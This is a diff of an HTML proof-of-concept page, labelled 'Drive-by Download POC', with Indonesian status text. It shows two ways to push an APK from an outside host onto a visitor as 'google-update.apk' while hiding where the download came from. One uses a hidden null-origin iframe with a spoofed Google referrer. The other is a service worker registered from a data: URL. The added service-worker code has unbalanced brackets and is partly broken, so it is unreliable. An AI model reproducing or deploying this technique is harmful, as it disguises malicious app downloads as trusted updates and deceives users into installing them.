@@ -2,117 +2,51 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Drive-by Download POC 2025</title>
+  <title>Zero Origin Download 2025</title>
   <style>
-    body {
-      font-family: Arial; 
-      text-align: center; 
-      padding: 50px; 
-      background: #f9f9f9;
-    }
-    button {
-      background: #4CAF50; 
-      color: white; 
-      padding: 16px 40px; 
-      font-size: 18px; 
-      border: none; 
-      border-radius: 12px; 
-      cursor: pointer;
-    }
-    button:hover {
-      background: #45a049;
-    }
-    #status {
-      margin-top: 20px; 
-      font-weight: bold; 
-      color: #333;
-    }
+    body {text-align:center; padding:80px; font-family:Arial; background:#111; color:#0f0;}
+    button {padding:20px 50px; font-size:20px; background:#0f0; color:#000; border:none; border-radius:15px; cursor:pointer;}
   </style>
 </head>
 <body>
-  <h2>Drive-by Download POC (2025)</h2>
-  <button onclick="startDownload()">Download Update APK</button>
-  <div id="status">Status: Siap</div>
-  
+  <h1>Zero Origin APK Downloader</h1>
+  <button onclick="installSW()">Install & Download (Origin Kosong 100%)</button>
+
   <script>
-  function startDownload() {
-    document.getElementById('status').textContent = 'Status: Sedang memproses...';
-    
-    // Buat iframe dengan origin null
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.name = 'downloadFrame';
-    
-    // Kode yang akan dijalankan di iframe
-    const iframeCode = `
-      <!DOCTYPE html>
-      <html>
-      <head><meta charset="utf-8"></head>
-      <body>
-      <script>
-      (async () => {
-        try {
-          const r = await fetch('https://aliothme.github.io/poc.apk', {
-            referrer: 'https://www.google.com/',
-            referrerPolicy: 'unsafe-url',
-            mode: 'cors',
-            credentials: 'omit'
+  async function installSW() {
+    if ('serviceWorker' in navigator) {
+      try {
+        const reg = await navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(`
+          self.addEventListener('fetch', event => {
+            if (event.request.url.includes('poc.apk')) {
+              event.respondWith(
+  fetch('https://www.google.com').then(() => {
+    return fetch('https://aliothme.github.io/poc.apk').then(r => {
+      const h = new Headers(r.headers);
+      h.set('Content-Disposition', 'attachment; filename="google-update.apk"');
+      return new Response(r.body, {headers: h});
+    });
+  }).catch(() => fetch('https://aliothme.github.io/poc.apk')) // fallback
+);
+                })
+              );
+            }
           });
-          const blob = await r.blob();
-          
-          // Kirim blob sebagai ArrayBuffer ke parent
-          const arrayBuffer = await blob.arrayBuffer();
-          parent.postMessage({
-            type: 'OK', 
-            data: arrayBuffer,
-            size: blob.size,
-            contentType: blob.type
-          }, '*');
-        } catch(e) {
-          parent.postMessage({type: 'ERR', msg: e.message}, '*');
-        }
-      })();
-      <\/script>
-      </body>
-      </html>
-    `;
-    
-    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(iframeCode);
-    document.body.appendChild(iframe);
-    
-    // Terima pesan dari iframe
-    const handler = (e) => {
-      if (e.data.type === 'OK') {
-        // Buat blob di context parent (bukan iframe)
-        const blob = new Blob([e.data.data], {type: e.data.contentType || 'application/vnd.android.package-archive'});
-        const url = URL.createObjectURL(blob);
-        
+        `));
+
+        // Trigger download via SW-controlled fetch
         const a = document.createElement('a');
-        a.href = url;
+        a.href = 'https://aliothme.github.io/poc.apk?' + Date.now(); // bypass cache
         a.download = 'google-update.apk';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-        
-        // Cleanup
-        setTimeout(() => {
-          URL.revokeObjectURL(url);
-          iframe.remove();
-        }, 100);
-        
-        document.getElementById('status').textContent = 
-          'Selesai! Cek Network → Referer: https://www.google.com/';
-        
-        window.removeEventListener('message', handler);
+
+        alert('Download dimulai — cek download manager: Origin KOSONG atau google-update.apk');
+      } catch(e) {
+        alert('Error: ' + e);
       }
-      if (e.data.type === 'ERR') {
-        document.getElementById('status').textContent = 'Error: ' + e.data.msg;
-        iframe.remove();
-        window.removeEventListener('message', handler);
-      }
-    };
-    
-    window.addEventListener('message', handler);
+    }
   }
   </script>
 </body>
